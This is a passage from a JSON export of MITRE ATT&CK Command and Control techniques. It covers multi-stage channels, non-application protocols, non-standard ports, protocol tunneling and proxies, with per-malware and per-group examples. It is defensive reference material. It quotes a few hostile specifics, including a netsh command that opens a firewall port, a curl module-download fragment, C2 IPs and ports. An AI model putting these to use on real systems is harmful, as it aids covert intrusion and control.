"G0102", "name": "Wizard Spider", "description": "Wizard Spider can transfer malicious payloads such as ransomware to compromised machines."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can download files from its C2 server, including the .NET DLLs, WoodySharpExecutor and WoodyPowerSession."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can download additional malicious files from its C2 server."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has a command to download files to the victim's machine."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET downloads browser specific AppleScript modules using a constructed URL with the curl command, https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript."}, {"id": "S0388", "name": "YAHOYAH", "description": "YAHOYAH uses HTTP GET requests to download other files that are executed in memory."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy obtains additional code to execute on the victim's machine, including the downloading of a secondary payload."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT can download additional payloads onto the victim."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can download additional malware plug-in modules and execute them on the victim\u2019s machine."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can download files to be saved on the compromised system."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used tools to download malicious files to compromised hosts."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has the ability to download files."}, {"id": "S0672", "name": "Zox", "description": "Zox can download files to a compromised machine."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command to transfer files from a remote host."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ can download and execute additional files."}], "sub_techniques": []}, {"name": "Multi-Stage Channels", "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.", "detailed_description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.", "id": "T1104", "examples": [{"id": "G0022", "name": "APT3", "description": "An APT3 downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81."}, {"id": "G0096", "name": "APT41", "description": "APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware."}, {"id": "S0534", "name": "Bazar", "description": "The Bazar loader is used to download and execute the Bazar backdoor."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE uses Microsoft\u2019s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims\u2019 machines."}, {"id": "S0220", "name": "Chaos", "description": "After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has used a two-tiered C2 configuration with tier one nodes connecting to the victim and tier two nodes connecting to backend infrastructure."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used multi-stage malware components that inject later stages into separate processes."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can use one C2 URL for first contact and to upload information about the host computer and two additional C2 URLs for getting commands."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can download and execute additional payloads and modules over separate communication channels."}, {"id": "S0022", "name": "Uroburos", "description": "Individual Uroburos implants can use multiple communication channels based on one of four available modes of operation."}, {"id": "S0476", "name": "Valak", "description": "Valak can download additional modules and malware capable of using separate C2 channels."}], "sub_techniques": []}, {"name": "Non-Application Layer Protocol", "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).", "detailed_description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.", "id": "T1095", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel."}, {"id": "S0504", "name": "Anchor", "description": "Anchor has used ICMP in C2 communications."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader establishes SOCKS5 connections for its initial C2."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has used TCP in C2 communications."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can use TCP to communicate with command and control servers."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has a command built in to use a raw TCP socket."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used raw sockets for network communication."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used TCP for C2 communications."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has the ability to use TCP for external C2."}, {"id": "S0043", "name": "BUBBLEWRAP", "description": "BUBBLEWRAP can communicate using SOCKS."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors used TCP for some C2 communications."}, {"id": "S0335", "name": "Carbon", "description": "Carbon uses TCP and UDP for C2."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to use TCP and UDP for communication."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER uses ICMP for transmitting configuration information to and from its command and control server."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can be configured to use TCP, ICMP, and UDP for C2 communications."}, {"id": "S0115", "name": "Crimson", "description": "Crimson uses a custom TCP protocol for C2."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic can use TCP in communications with C2."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can use sockets for communications to its C2 server."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used the Unix socket and a reverse TCP shell for C2 communications."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can use TCP to communicate between its agent and client modules."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses socket-based tunneling utilities for command and control purposes such as NetCat and Go Simple Tunnel (GOST). These tunnels are used to push interactive command prompts over the created sockets. Ember Bear has also used reverse TCP connections from Meterpreter installations to communicate back with C2 infrastructure."}, {"id": "S0076", "name": "FakeM", "description": "Some variants of FakeM use SSL to communicate with C2 servers."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Metasploit Bind and Reverse TCP stagers."}, {"id": "S1144", "name": "FRP", "description": "FRP can communicate over TCP, TCP stream multiplexing, KERN Communications Protocol (KCP), QUIC, and UDP."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can communicate with C2 over TCP and UDP."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to use TCP and UDP in C2 communications."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has used an encrypted protocol within TCP segments to communicate with the C2."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used TCP for C2."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp communicates with a simple network protocol over TCP."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used TCP to download additional modules."}, {"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG can use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity command and control traffic uses a non-standard, likely custom protocol for communication."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can function as a stand-alone backdoor communicating over the /tmp/clientsDownload.sock socket."}, {"id": "S0582", "name": "LookBack", "description": "LookBack uses a custom binary protocol over sockets for C2 communications."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can ping a specific C2 URL with the ID of a victim machine in the subdomain."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has used a custom JSON-based protocol for its C&C communications."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can use raw TCP for C2."}, {"id": "G1013", "name": "Metador", "description": "Metador has used TCP for C2."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can establish an indirect and raw TCP socket-based connection to the C2 server."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used raw TCP for C2."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type network traffic can communicate over a raw socket."}, {"id": "S0083", "name": "Misdat", "description": "Misdat network traffic communicates over a raw socket."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind completes network communication via raw sockets."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports WebSocket and TCP-based C2 profiles."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can use TCP in C2 communications."}, {"id": "S0034", "name": "NETEAGLE", "description": "If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use TCP in C2 communications."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can forward TCP packets between the C2 and a remote host."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used a custom protocol for command and control."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has used a custom binary protocol over port 443 for C2 traffic."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key has sent its public key to the C2 server over TCP."}, {"id": "S0587", "name": "Penquin", "description": "The Penquin C2 mechanism is based on TCP and UDP packets."}, {"id": "S0158", "name": "PHOREAL", "description": "PHOREAL communicates via ICMP for C2."}, {"id": "S1031", "name": "PingPull", "description": "PingPull variants have the ability to communicate with C2 servers using ICMP or TCP."}, {"id": "S0501", "name": "PipeMon", "description": "The PipeMon communication module can use a custom protocol based on TLS over TCP."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has used the Intel\u00ae Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can be configured to use raw TCP or UDP for command and control."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability use TCP to send or receive C2 packets."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can use TCP for C2 communication."}, {"id": "S1084", "name": "QUIETEXIT", "description": "QUIETEXIT can establish a TCP connection as part of its initial connection to the C2."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use TCP in C2 communications."}, {"id": "S0055", "name": "RARSTONE", "description": "RARSTONE uses SSL to encrypt its communication with its C2 server."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to use TCP and UDP in C2 communications."}, {"id": "S0172", "name": "Reaver", "description": "Some Reaver variants use raw TCP for C2."}, {"id": "S0019", "name": "Regin", "description": "The Regin malware platform can use ICMP to communicate between infected computers."}, {"id": "S0125", "name": "Remsec", "description": "Remsec is capable of using ICMP, TCP, and UDP for C2."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro uses a custom binary protocol using a type, length, value format over TCP."}, {"id": "S1073", "name": "Royal", "description": "Royal establishes a TCP socket for C2 communication using the API WSASocketW."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can use a proxy module to forward TCP packets to external hosts."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can communicate with actor-controlled C2 servers by using a custom little-endian binary protocol."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to communicate with C2 with TCP over port 443."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has used UDP for C2 communications."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has the ability to use TCP sockets to send data and ICMP to ping the C2 server."}, {"id": "S1140", "name": "Spica", "description": "Spica can use JSON over WebSockets for C2 communications."}, {"id": "S1049", "name": "SUGARUSH", "description": "SUGARUSH has used TCP for C2."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can use TCP for C2 communications."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used a passive backdoor that receives commands with UDP packets."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie can use ICMP to receive information on the destination server."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon provides access to the system via SSH or any other protocol that uses PAM to authenticate."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can communicate through custom methodologies for UDP,  ICMP, and TCP that use distinct sessions to ride over the legitimate protocols."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation used a non-standard TCP session to initialize communication prior to establishing HTTPS command and control."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can communicate with its C2 server via TCP over port 5200."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can use TCP for C2 communications."}, {"id": "S0155", "name": "WINDSHIELD", "description": "WINDSHIELD C2 traffic can communicate via TCP raw sockets."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used ICMP, custom TCP, and UDP in outbound communications."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can communicate using custom TCP."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can communicate with C2 using a custom binary protocol."}], "sub_techniques": []}, {"name": "Non-Standard Port", "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.", "detailed_description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.", "id": "T1571", "examples": [{"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has used port 4050 for C2 communications."}, {"id": "G0050", "name": "APT32", "description": "An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used HTTP over TCP ports 808 and 880 for command and control."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL communicates on ports 443 and 8000 with a FakeTLS method."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot binds and listens on port 1058 for HTTP traffic while also utilizing a FakeTLS method."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear has used a custom RC4 and XOR encrypted protocol over port 443 for C2."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2."}, {"id": "S1155", "name": "Covenant", "description": "Covenant listeners and controllers can be configured to use non-standard ports."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can use non-standard ports for C2 not typically associated with HTTP or HTTPS traffic."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi has used unencrypted HTTP on port 443 for C2."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used various non-standard ports for C2 communication."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used HTTP over ports such as 20, 22, 443, 7080, and 50000, in addition to using ports commonly associated with HTTP/S."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has used HTTP over ports 9005 and 9006 for network traffic, 9002 for C2 requests, 33666 as a WebSocket, and 8090 to download files."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT has used HTTP over a non-standard port, such as TCP port 46769."}, {"id": "S0246", "name": "HARDRAIN", "description": "HARDRAIN binds and listens on port 443 with a FakeTLS method."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has connected outbound over TCP port 443 with a FakeTLS method."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity generates a random port number greater than 30,000 to serve as the listener for subsequent command and control activity."}, {"id": "G0032", "name": "Lazarus Group", "description": "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has used TCP port 5633 for C2 Communication."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has communicated with hosts over raw TCP on port 9999."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has used port 1177 for HTTP C2 communications."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has used a custom binary protocol over TCP port 443 for C2."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot uses non-standard ports, such as 2967, 2223, and others, for HTTPS command and control communication."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can use HTTPS over port 8080 for C2."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT used TLS to encrypt communications over port 143"}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can use port 4782 on the compromised host for TCP callbacks."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will communicate via HTTP over port 8080 for command and control traffic."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can use HTTP over non-standard ports, such as 995, for C2."}, {"id": "G0106", "name": "Rocke", "description": "Rocke's miner connects to a C2 server using port 51640."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro uses a custom binary protocol over TCP port 443."}, {"id": "S0148", "name": "RTM", "description": "RTM used Port 44443 for its VNC module."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used port 6789 to accept connections on the group's SSH server."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443."}, {"id": "G0091", "name": "Silence", "description": "Silence has used port 444 when sending data about the system from the client to the server."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has used HTTPS over port 1402 in C2 communication."}, {"id": "S1049", "name": "SUGARUSH", "description": "SUGARUSH has used port 4585 for a TCP connection to its C2."}, {"id": "S0266", "name": "TrickBot", "description": "Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. Newer versions of TrickBot have been known to use a custom communication protocol which sends the data unencrypted over port 443. "}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME has used ports 443, 8080, and 8443 with a FakeTLS method."}, {"id": "S0515", "name": "WellMail", "description": "WellMail has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has used HTTPS over ports 2083 and 2087 for C2."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can use ports 1985 and 1986 in HTTP/S communication."}], "sub_techniques": []}, {"name": "Protocol Tunneling", "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.", "detailed_description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.\nProtocol Tunneling may also be abused by adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.\nAdversaries may also leverage Protocol Tunneling in conjunction with Proxy and/or Protocol or Service Impersonation to further conceal C2 communications and infrastructure.", "id": "T1572", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the GOGETTER tunneler software to establish a \"Yamux\" TLS-based C2 channel with an external server(s)."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use DNS over HTTPS for C2."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used SSH tunneling in targeted environments."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used the Iox and NPS proxy and tunneling tools in combination  create multiple connections through a single tunnel."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used the Plink utility to create SSH tunnels."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used Iodine to tunnel IPv4 traffic over DNS."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can use DNS over HTTPS (DoH) to resolve C2 nodes."}, {"id": "S0038", "name": "Duqu", "description": "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used ProxyChains to tunnel protocols to internal networks."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized web shells and Java tools for tunneling capabilities to and from compromised assets."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers."}, {"id": "S0173", "name": "FLIPSIDE", "description": "FLIPSIDE uses RDP to tunnel traffic from a victim environment."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as ngrok and custom tool SSHMinion."}, {"id": "S1144", "name": "FRP", "description": "FRP can tunnel SSH and Unix Domain Socket communications over TCP between external nodes and exposed resources behind firewalls or NAT."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can connect to HTTP proxies via TCP to create a tunnel to C2."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can use a custom protocol tunneled through DNS or HTTP."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can run a custom binary protocol under HTTPS for C2."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used Plink to tunnel RDP over SSH."}, {"id": "S1015", "name": "Milan", "description": "Milan can use a custom protocol tunneled through DNS or HTTP."}, {"id": "S0699", "name": "Mythic", "description": "Mythic can use SOCKS proxies to tunnel traffic through another protocol."}, {"id": "S0508", "name": "ngrok", "description": "ngrok can tunnel RDP and other services securely over internet connections."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used the Plink utility and other tools to create tunnels to C2 servers."}, {"id": "S0650", "name": "QakBot", "description": "The QakBot proxy module can encapsulate SOCKS5 protocol within its own proxy protocol."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets, HTTP, SMTP, and DNS."}], "sub_techniques": []}, {"name": "Proxy", "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.", "detailed_description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.", "id": "T1090", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 used a tool called CLASSFON to covertly proxy network communications."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to use a reverse SOCKS proxy module."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can utilize proxy for communications."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL functions as a proxy server between the victim and C2 server."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers. BADHATCH can also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has supported use of a proxy server."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used FRP, ssf, and Venom to establish SOCKS proxy connections."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can act as a reverse proxy."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used a customized version of the Iox port-forwarding and proxy tool."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens has used the AirVPN service for operational activity."}, {"id": "S0384", "name": "Dridex", "description": "Dridex contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca adopted Cloudflare as a proxy for compromised servers."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers."}, {"id": "S1144", "name": "FRP", "description": "FRP can proxy communications through a server in public IP space to local servers located behind a NAT or firewall."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can identify and use configured proxies in a compromised network for C2 communication."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can use proxies for C2 traffic."}, {"id": "S0246", "name": "HARDRAIN", "description": "HARDRAIN uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has multiple proxy options that mask traffic between the malware and the remote operators."}, {"id": "S0040", "name": "HTRAN", "description": "HTRAN can proxy TCP socket connections to obfuscate command and control infrastructure."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can serve as a SOCKS proxy server."}, {"id": "S0487", "name": "Kessel", "description": "Kessel 